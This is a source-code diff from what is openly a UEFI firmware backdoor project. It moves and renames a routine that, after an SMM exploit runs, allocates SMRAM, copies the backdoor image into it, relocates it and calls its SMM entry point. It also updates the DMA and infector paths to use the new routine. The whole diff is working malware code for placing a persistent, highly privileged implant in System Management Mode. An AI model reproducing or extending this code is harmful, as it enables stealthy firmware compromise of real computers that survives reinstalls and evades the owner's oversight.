@@ -1531,6 +1531,43 @@ VOID BackdoorSmm(EFI_SMM_SYSTEM_TABLE2 *Smst)
 #endif // USE_PERIODIC_TIMER
 
 }
+
+VOID BackdoorSmmCall(EFI_SMM_SYSTEM_TABLE2 *Smst)
+{
+    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
+        m_ImageBase,
+        ((EFI_IMAGE_DOS_HEADER *)m_ImageBase)->e_lfanew
+    );
+
+    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
+    EFI_PHYSICAL_ADDRESS Addr = 0;
+
+    // allocate SMRAM memory for backdoor image
+    EFI_STATUS Status = Smst->SmmAllocatePages(
+        AllocateAnyPages,
+        EfiRuntimeServicesData,
+        PagesCount,
+        &Addr
+    );
+    if (Status == EFI_SUCCESS)
+    {
+        VOID *Image = (VOID *)Addr;
+
+        BACKDOOR_ENTRY_SMM Entry = (BACKDOOR_ENTRY_SMM)RVATOVA(
+            Image,
+            (UINT8 *)BackdoorSmm - (UINT8 *)m_ImageBase
+        );
+
+        // copy image to the new location
+        m_BS->CopyMem(Image, m_ImageBase, pHeaders->OptionalHeader.SizeOfImage);
+
+        // update image relocations in according to the new address
+        LDR_UPDATE_RELOCS(Image, m_ImageBase, Image);
+
+        // execute SMM entry point of the backdoor
+        Entry(Smst);
+    }
+}
 //--------------------------------------------------------------------------------------
 #ifdef USE_PERIODIC_TIMER
 
@@ -1705,43 +1742,6 @@ VOID BackdoorResidentCommon(VOID *Image)
     }
 }
 //--------------------------------------------------------------------------------------
-VOID ExploitProc(EFI_SMM_SYSTEM_TABLE2 *Smst)
-{
-    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
-        m_ImageBase, 
-        ((EFI_IMAGE_DOS_HEADER *)m_ImageBase)->e_lfanew
-    );
-    
-    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
-    EFI_PHYSICAL_ADDRESS Addr = 0;    
-
-    // allocate SMRAM memory for backdoor image
-    EFI_STATUS Status = Smst->SmmAllocatePages(
-        AllocateAnyPages,
-        EfiRuntimeServicesData,
-        PagesCount,
-        &Addr
-    );
-    if (Status == EFI_SUCCESS)
-    {                 
-        VOID *Image = (VOID *)Addr;
-
-        BACKDOOR_ENTRY_SMM Entry = (BACKDOOR_ENTRY_SMM)RVATOVA(
-            Image,
-            (UINT8 *)BackdoorSmm - (UINT8 *)m_ImageBase
-        );
-
-        // copy image to the new location
-        m_BS->CopyMem(Image, m_ImageBase, pHeaders->OptionalHeader.SizeOfImage); 
-
-        // update image relocations in according to the new address
-        LDR_UPDATE_RELOCS(Image, m_ImageBase, Image);
-
-        // execute SMM entry point of the backdoor
-        Entry(Smst);
-    }
-}
-
 VOID BackdoorResidentDma(VOID *Image)
 {
     PINFECTOR_STATUS Status = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);
@@ -1764,8 +1764,8 @@ VOID BackdoorResidentDma(VOID *Image)
     // report sucessfully executed DXE driver
     Status->Success += 1;
 
-    // execute exploit and load backdoor into the SMRAM
-    Exploit(ExploitProc);
+    // run exploit to load backdoor into SMRAM and execute its entry point
+    Exploit(BackdoorSmmCall);
 }
 //--------------------------------------------------------------------------------------
 VOID BackdoorResidentInfector(VOID *Image)
@@ -1792,8 +1792,8 @@ VOID BackdoorResidentInfector(VOID *Image)
 
             if ((Status = SmmBase->GetSmstLocation(SmmBase, &Smst)) == EFI_SUCCESS)
             {
-                // execute SMM entry point of the backdoor
-                BackdoorSmm(Smst);
+                // load backdoor into the SMRAM and execute its entry point
+                BackdoorSmmCall(Smst);
             }   
             else
             {
